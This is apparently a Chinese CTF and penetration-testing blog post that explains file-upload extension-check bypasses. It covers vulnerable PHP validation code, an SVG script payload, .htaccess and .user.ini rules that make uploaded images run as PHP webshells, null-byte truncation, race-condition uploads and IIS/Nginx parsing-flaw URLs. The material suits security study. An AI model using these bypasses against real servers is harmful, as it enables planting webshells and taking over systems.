<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="mayylu">



    <meta name="description" content="学习是一种生活态度">



<title>文件上传-文件后缀检测绕过 | mayylu&#39;s blog</title>



    <link rel="icon" href="/vue.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 5.4.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">mayylu&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/categories">Categories</a>
                
                    <a class="menu-item" href="/tags">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">mayylu&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/categories">Categories</a>
                
                    <a class="menu-item" href="/tags">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">文件上传-文件后缀检测绕过</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">mayylu</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">六月 10, 2025&nbsp;&nbsp;</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/fileupload/">fileupload</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>22年春天跟着学长学ctf的时候写的文章，写的很烂，后来打了不少iis系统，遇到了不少文件上传的漏洞，并且之前这篇文章在php标签下面，不准确而且文件类型的漏洞完全可以当成一个专题来写，比如文件内容检测，文件上传后缀名检测，文件上传位置的获取和限制等，所以重写了这篇文章。</p>
<p>文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。</p>
<span id="more"></span>
<p><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220205192532.jpg" alt="微信图片_20220205192532">   </p>
<h2 id="获取文件的信息"><a href="#获取文件的信息" class="headerlink" title="获取文件的信息"></a>获取文件的信息</h2><p>当我们找到了一个文件上传接口，兴冲冲的上传一个文件上去，我们的文件会以怎么样的一种方式上传上去的那，系统又会怎么操作我们上传的文件，这里用之前写的php文件上传做示例</p>
<h3 id="文件上传数据包解析"><a href="#文件上传数据包解析" class="headerlink" title="文件上传数据包解析"></a>文件上传数据包解析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST /upload HTTP/1.1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxyz</span><br><span class="line">.......</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryxyz</span><br><span class="line">Content-Disposition: form-data; name=&quot;desc&quot;</span><br><span class="line"></span><br><span class="line">个人简介</span><br><span class="line">------WebKitFormBoundaryxyz</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryxyz</span><br><span class="line">Content-Disposition: form-data; name=&quot;file1&quot;; filename=&quot;2.svg&quot;</span><br><span class="line">Content-Type: image/svg+xml</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;</span><br><span class="line">&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;</span><br><span class="line">   &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot;/&gt;</span><br><span class="line">   &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">      alert(123);</span><br><span class="line">   &lt;/script&gt;</span><br><span class="line">&lt;/svg&gt;</span><br><span class="line">------WebKitFormBoundaryxyz--</span><br></pre></td></tr></table></figure>

<p>字段的分割符 必须和 Content-Type 里的 boundary保持一致。然后开头 – 固定要加，结尾再加 – 表示结束。<br>可以看出文件上传本质上是表单的一个字段，实例中的”file1”为字段名</p>
<p>Content-Disposition：数据来源，form-data表示接收的是表单数据<br>name：表单参数值需要和后端对应，不能更改<br>filename：文件名，可以更改<br>Content-Type：数据类型，视情况更改   </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">MIME值	                            含义</span><br><span class="line">text/plain	                        纯文本</span><br><span class="line">text/html	                        HTML文档</span><br><span class="line">text/javascript	                    js代码</span><br><span class="line">application/xhtml+xml	            XHTML文档</span><br><span class="line">image/gif	                        GIF图像</span><br><span class="line">image/jpeg	                        JPEG图像</span><br><span class="line">image/png	                        PNG图像</span><br><span class="line">video/mpeg	                        MPEG动画</span><br><span class="line">application/octet-stream	        二进制数据</span><br><span class="line">application/pdf	                    PDF文档</span><br><span class="line">application/(编程语言)	            该种语言的代码</span><br><span class="line">application/msword	                Microsoft Word文件</span><br><span class="line">message/rfc822	                    RFC 822形式</span><br><span class="line">multipart/alternative	            HTML邮件的HTML形式和纯文本形式，相同内容使用不同形式表示</span><br><span class="line">application/x-www-form-urlencoded	POST方法提交的表单</span><br><span class="line">multipart/form-data	                POST提交时伴随文件上传的表单</span><br></pre></td></tr></table></figure>
<h3 id="FILES"><a href="#FILES" class="headerlink" title="$_FILES"></a>$_FILES</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file1&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)<span class="comment">//name=file</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;错误：&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file1&quot;</span>][<span class="string">&quot;error&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;上传文件名: (包括后缀)&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file1&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;文件类型:（对应字段的Content-Type） &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file1&quot;</span>][<span class="string">&quot;type&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//浏览器根据后缀设置的打开方式，如 Content-Type: image/jpeg</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;文件大小（单位为字节）: &quot;</span> . (<span class="variable">$_FILES</span>[<span class="string">&quot;file1&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>) . <span class="string">&quot; kB&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;文件临时存储的位置（当文件上传时会被临时存放在一个随机文件里）: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file1&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];    </span><br><span class="line">    move_uploaded_file(<span class="variable">$_FilES</span>[<span class="string">&#x27;file1&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$newfile</span>);<span class="comment">//将上传的文件移动到新位置,$newfile为新文件的相对路径</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">```   </span><br><span class="line"><span class="comment">### 不能作为文件名的字符</span></span><br><span class="line">为了和路径区分，一些字符是不被允许当作文件名的</span><br><span class="line">Windows:	**\ / : * ? <span class="string">&quot; &lt; &gt; ASCII 0-31**</span></span><br><span class="line"><span class="string">Linux:	    **/、\0（NULL）**</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">如果文件名里出现了这些信息，出现位置前的内容都会被去掉，这样的设定一定程度上限制了文件上传漏洞的利用，如上传到/tmp目录下，而php工作目录在/www,无法用网址解析，则不存在文件上传漏洞</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">文件名中危险字符的判断最终由 OS 决定，所以大部分文件上传函数都不会处理文件名里的字符，如`<span class="subst">$_FILES</span>[&#x27;userfile&#x27;][&#x27;name&#x27;]` 不会 自动去除或过滤文件名中的 ../ 或其他路径遍历片段；它原样返回浏览器提交的 filename 值</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">## 黑名单</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">### 黑名单后缀检测绕过</span></span><br><span class="line"><span class="string">一般分为两种，一种是代码层次的黑名单绕过，及在检测后缀后，有可能存在修改，如检测后修改文件名，就有可能把后缀一起修改了</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">第二种是系统与代码解析差异导致的绕过，如win不区分大小写，Windows中文件后缀名.系统会自动忽略</span></span><br><span class="line"><span class="string">```php</span></span><br><span class="line"><span class="string">        <span class="subst">$file_name</span> = deldot(<span class="subst">$file_name</span>);//删除文件名末尾的点   Windows中文件后缀名.系统会自动忽略，点号绕过</span></span><br><span class="line"><span class="string">        <span class="subst">$file_ext</span> = strrchr(<span class="subst">$file_name</span>, &#x27;.&#x27;);//提取后缀  </span></span><br><span class="line"><span class="string">        <span class="subst">$file_ext</span> = strtolower(<span class="subst">$file_ext</span>); //转换为小写        win大小写不敏感，大小写绕过</span></span><br><span class="line"><span class="string">        <span class="subst">$file_ext</span> = str_ireplace(&#x27;::<span class="subst">$DATA</span>&#x27;, &#x27;&#x27;, <span class="subst">$file_ext</span>);//去除字符串::<span class="subst">$DATA</span>     </span></span><br><span class="line"><span class="string">        <span class="subst">$file_ext</span> = trim(<span class="subst">$file_ext</span>); //收尾去空   空格绕过</span></span><br><span class="line"><span class="string">        if(!in_array(<span class="subst">$file_ext</span>, <span class="subst">$deny_ext</span>)) &#123;</span></span><br><span class="line"><span class="string">            <span class="subst">$temp_file</span> = <span class="subst">$_FILES</span>[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span></span><br><span class="line"><span class="string">            <span class="subst">$img_path</span> = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;</span>YmdHis<span class="string">&quot;).rand(1000,9999).<span class="subst">$file_ext</span>;              </span></span><br><span class="line"><span class="string">            if (move_uploaded_file(<span class="subst">$temp_file</span>,<span class="subst">$img_path</span>)) &#123;</span></span><br><span class="line"><span class="string">                 <span class="subst">$is_upload</span> = true;    </span></span><br><span class="line"><span class="string">            &#125; else &#123;</span></span><br><span class="line"><span class="string">                <span class="subst">$msg</span> = &#x27;上传出错！&#x27;;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">            <span class="subst">$msg</span> = &#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        if(!exif_imagetype(<span class="subst">$tmp_name</span>)) die(&quot;</span>^_^<span class="string">&quot;); //读取一个图像的第一个字节并检查其签名。 </span></span><br><span class="line"><span class="string">        //返回一个数组，索引 0 和 1 分别包含图像的宽度和高度，索引 2 是表示图像类型的某个 IMAGETYPE_XXX 常量。 </span></span><br><span class="line"><span class="string">        <span class="subst">$info</span> = @getimagesize(<span class="subst">$tmp_name</span>);</span></span><br><span class="line"><span class="string">        if (false === <span class="subst">$info</span> || (IMAGETYPE_GIF === <span class="subst">$info</span>[2] &amp;&amp; empty(<span class="subst">$info</span>[&#x27;bits&#x27;]))) &#123;</span></span><br><span class="line"><span class="string">            throw new ImageException(&#x27;Illegal image file&#x27;);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br></pre></td></tr></table></figure>

<p>在window的时候如果文件名+<code>::$DATA</code>会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名，他的目的就是不检查后缀名       </p>
<h3 id="存在其他有可能正常解析的后缀"><a href="#存在其他有可能正常解析的后缀" class="headerlink" title="存在其他有可能正常解析的后缀"></a>存在其他有可能正常解析的后缀</h3><p>PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc<br>.php, .php3, .php4, .php5, .php7    这些后缀如果，php 版本x&gt; .phpy的y,则可以使用<br>.phps，高亮源码显示，不执行脚本，通常只做源码查看</p>
<p>ASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml<br>IIS6.0:下可以当asp执行的有asa,cer,cdx<br>Cer在7.0下有的可以有的不行。<br>Asa在IIS7.0，7.5也可以。</p>
<p>Jsp: .jsp, .jspx, .jsw, .jsv, .jspf<br>Tomcat&lt;=4.x ,默认执行：.jsp<br>Tomcat&gt;=5.x 可以执行 .jspx，.jspf 依然只作为 include 文件，不能直接执行</p>
<p><code>exif_imagetype</code>和<code>@getimagesize($tmp_name)[2]</code>可以通过抓包将文件内容的开头加上GIF89a(一种GIF标识)的方法绕过</p>
<h3 id="利用自定义解析绕过黑名单"><a href="#利用自定义解析绕过黑名单" class="headerlink" title="利用自定义解析绕过黑名单"></a>利用自定义解析绕过黑名单</h3><h4 id="Apache的-htaccess"><a href="#Apache的-htaccess" class="headerlink" title="Apache的.htaccess"></a>Apache的.htaccess</h4><p>从安全性考虑，根目录的AllowOverride属性一般都配置成<code>None</code>不允许任何Override,需要更改文件 <code>/etc/apache2/apache2.conf</code> </p>
<p>htaccess文件是<strong>Apache服务器</strong>中的一个配置文件，它负责相关目录下的网页配置，利用Apache的rewrite模块对URL进行重写，rewrite规则会写在 .htaccess 文件里</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Directory</span> /<span class="attr">var</span>/<span class="attr">www</span>/&gt;</span></span><br><span class="line">        Options Indexes FollowSymLinks</span><br><span class="line">        AllowOverride All</span><br><span class="line">        Require all granted</span><br><span class="line"><span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>需要用到的代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;匹配内容&quot;</span>&gt;</span><br><span class="line">Sethandler application/x-httpd-php <span class="comment">//按照PHP文件来执行</span></span><br><span class="line">&lt;/Eilesmatch &gt;</span><br><span class="line"></span><br><span class="line">AddType application/x-httpd-php .htm，则.htm文件也可以执行php程序</span><br><span class="line">AddHandler cgi-script .yyy 则扩展名为.yyy的文件作为 CGI 脚本来处理</span><br></pre></td></tr></table></figure>
<p>实战意义：</p>
<p>1、如果存在可以上传 .htaccess 文件，就可以直接利用此规则解析；</p>
<p>2、如果存在修改文件权限，就直接修改解析规则；  </p>
<h4 id="user-ini留后门"><a href="#user-ini留后门" class="headerlink" title=".user.ini留后门"></a>.user.ini留后门</h4><p>.htaccess是伪静态环境配置文件，用于lamp。<br>.user.ini是lnmp文件，里面放的是你网站的文件夹路径地址。目的是防止跨目录访问和文件跨目录读取.<br>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。<br>跟.htaccess后门比，适用范围更广，nginx/apache/IIS都有效，而.htaccess只适用于apache<br>使用方法很简单，直接写在.user.ini中：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=shell.jpg</span><br></pre></td></tr></table></figure>
<p>11.gif是要包含的文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file 在文顶部插入加载文件；</span><br><span class="line"></span><br><span class="line">auto_append_file 在文件最后插入加载文件（当文件调用的有exit()时该设置无效</span><br></pre></td></tr></table></figure>
<p>我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。</p>
<h2 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h2><p><strong>绕过白名单的方法同样适用于黑名单</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;  </span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;   </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="php老版本文件截断绕过"><a href="#php老版本文件截断绕过" class="headerlink" title="php老版本文件截断绕过"></a>php老版本文件截断绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;files/&#x27;</span>.<span class="variable">$action</span>.<span class="string">&#x27;.php&#x27;</span>); <span class="comment">//载入相应文件</span></span><br></pre></td></tr></table></figure>
<h4 id="00截断绕过"><a href="#00截断绕过" class="headerlink" title="00截断绕过"></a>00截断绕过</h4><p>要求：<br><strong>php&lt;5.3.4</strong>   magic_quotes_gpc=off(默认on,5.4以后该选项被移除)<br>检测原理：<br>有很多0x00，%00，/00之类的截断，但是核心都在chr(0)这个字符，它可以返回ascii字符，所以chr(0)表示的是null,如果变量是从用户$_GET或$_POST中获得的并且我们可控，那么我们可以利用空字符\x00来截断后面的拓展名，从而造成任意文件上传。     </p>
<h4 id="长度截断绕过"><a href="#长度截断绕过" class="headerlink" title="长度截断绕过"></a>长度截断绕过</h4><p>要求：<br><strong>php版本&lt;=5.2.8</strong><br>linux 需要文件名长于 4096，windows 需要长于 256，超过部分会被丢弃从而实现文件包含绕过后缀.php限制</p>
<h3 id="竞争上传"><a href="#竞争上传" class="headerlink" title="竞争上传"></a>竞争上传</h3><p>检测原理： </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$upload_file</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             rename(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>
<p>文件先经过保存 ,然后判断后缀名是否在白名单中, 如果不在则删除. 此时可以利用条件竞争在保存文件后删除文件前来执行php文件 </p>
<h3 id="中间件解析漏洞"><a href="#中间件解析漏洞" class="headerlink" title="中间件解析漏洞"></a>中间件解析漏洞</h3><p>IIS<br>6.0 一般windows server 2003<br>7.0/7.5 一般windows server 2008，并且开始支持 ASP.NET<br>8.0/8.5 一般windows server 2012<br>10.0 一般windows server 2016</p>
<h4 id="IIS5-x-6-x解析漏洞"><a href="#IIS5-x-6-x解析漏洞" class="headerlink" title="IIS5.x-6.x解析漏洞"></a>IIS5.x-6.x解析漏洞</h4><p>使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；所以该解析漏洞也只能解析asp文件，而不能解析aspx文件。</p>
<p>目录解析(6.0)<br>形式：<a target="_blank" rel="noopener" href="http://www.xxx.com/xx.asp/xx.jpg">www.xxx.com/xx.asp/xx.jpg</a><br>原理:：服务器默认会把.asp，.asa目录下的文件都解析成asp文件。</p>
<p>文件解析(5.0/6.0)<br>形式：<a target="_blank" rel="noopener" href="http://www.xxx.com/xx.asp;.jpg">www.xxx.com/xx.asp;.jpg</a><br>原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。</p>
<h4 id="IIS-7-0、IIS-7-5、Nginx-engine-x-lt-8-03-畸形解析漏洞"><a href="#IIS-7-0、IIS-7-5、Nginx-engine-x-lt-8-03-畸形解析漏洞" class="headerlink" title="IIS 7.0、IIS 7.5、Nginx(engine x) &lt;8.03 畸形解析漏洞"></a>IIS 7.0、IIS 7.5、Nginx(engine x) &lt;8.03 畸形解析漏洞</h4><p>漏洞原理<br>在默认Fast-CGI开启状况下，当访问 <a target="_blank" rel="noopener" href="http://www.xx.com/phpinfo.jpg/1.php">www.xx.com/phpinfo.jpg/1.php</a> 这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析。这就要说到fix_pathinfo这个选项了， 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：</p>
<p>PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了。</p>
<p>漏洞形式<br><a target="_blank" rel="noopener" href="http://www.xxxx.com/UploadFiles/image/1.jpg/1.php">www.xxxx.com/UploadFiles/image/1.jpg/1.php</a><br><a target="_blank" rel="noopener" href="http://www.xxxx.com/UploadFiles/image/1.jpg%00.php">www.xxxx.com/UploadFiles/image/1.jpg%00.php</a><br><a target="_blank" rel="noopener" href="http://www.xxxx.com/UploadFiles/image/1.jpg/%20/0.php">www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php</a></p>
